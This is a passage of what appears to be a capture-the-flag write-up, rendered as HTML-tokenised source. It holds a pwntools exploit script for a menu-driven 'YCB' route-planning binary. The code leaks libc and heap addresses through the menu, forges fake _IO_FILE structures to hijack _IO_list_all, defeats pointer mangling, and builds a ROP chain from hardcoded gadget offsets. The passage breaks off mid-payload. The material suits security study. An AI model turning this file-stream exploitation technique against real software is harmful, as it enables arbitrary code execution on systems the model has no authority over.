data-num=\"48\"></td><td><pre>Welcome to YCB!</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>Do you like traveling? Let's start our trip from Guangzhou!</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>Since this is only the simplified version, only five cities in total can be considered at present. I'm sorry!</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>**guangzhou/nanning/changsha/nanchang/fuzhou**</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>1. Add route.</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>2. Delete route.</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>3. Show route.</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>4. Edit route.</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>5. Calculate the distance.</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'5. Calculate the distance.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>tp<span class=\"token punctuation\">,</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">,</span>jl<span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'car/train/plane?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'How far?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>jl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Note:\\n'</span><span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">,</span>cg<span class=\"token punctuation\">,</span>jl<span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which one do you want to change?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>cg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'How far?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>jl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Note:\\n'</span><span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Dijkstra</span><span class=\"token punctuation\">(</span>city<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>city<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\tr <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\tDijkstra<span class=\"token punctuation\">(</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1234'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4ef</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t\tshow<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\tlibcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x21b110</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4f7</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\tshow<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t\theapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x001470</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t\tlg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t\tlg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t\ttarget<span class=\"token operator\">=</span>libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t\tfake_io_1_addr<span class=\"token operator\">=</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x1470</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t\tfake_io_2_addr<span class=\"token operator\">=</span>fake_io_1_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t\t\t\toffset <span class=\"token operator\">=</span> <span class=\"token number\">0x3</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t\t\t\toffset <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t\t\t\toffset <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t\t\t_IO_wstrn_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216dc0</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\t\t\t_IO_cookie_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216b80</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t\t\t\t_lock <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span>  <span class=\"token number\">0x21ca60</span><span class=\"token comment\">#libc.sym._IO_stdfile_2_lock</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t\t\t\tpoint_guard_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> offset <span class=\"token operator\">+</span> <span class=\"token number\">0x770</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t\t\t\tlog<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"point_guard_addr:\\t\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>point_guard_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\t\texpected <span class=\"token operator\">=</span> fake_io_2_addr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t\tmagic_gadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000167420</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t\t\t\tmov_rsp_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x5a120</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t\t\t\tadd_rsp_0x20_pop_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xd2ba5</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t\t\t\tpop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2a3e5</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t\t\t\tpop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2be51</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t\t\t\tpop_rdx_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x904a9</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t\t\t\tfake_io_1 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>chain <span class=\"token operator\">=</span> fake_io_2_addr</pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"152\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_wide_data <span class=\"token operator\">=</span> point_guard_addr</pre></td></tr><tr><td data-num=\"153\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_wstrn_jumps</pre></td></tr><tr><td data-num=\"154\"></td><td><pre>\t\t\t\t\t\t </pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\t\t\t\tfake_io_2 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_cookie_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0x58</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t\t\t\t\t </pre></td></tr><tr><td data-num=\"163\"></td><td><pre>\t\t\t\t\t </pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t\t\t\tdata <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t\t\t\t    <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>\t\t\t\t    <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> rol<span class=\"token punctuation\">(</span>magic_gadget <span class=\"token operator\">^</span> expected<span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0x100</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t\t\t\t            add_rsp_0x20_pop_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t\t\t\t            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>\t\t\t\t            mov_rsp_rdx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>\t\t\t\t            pop_rdi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>\t\t\t\t            fake_io_2_addr <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span><span class=\"token number\">0xfff</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>\t\t\t\t            pop_rsi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0x4000</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>\t\t\t\t            pop_rdx_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>\t\t\t\t            <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>\t\t\t\t            libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token 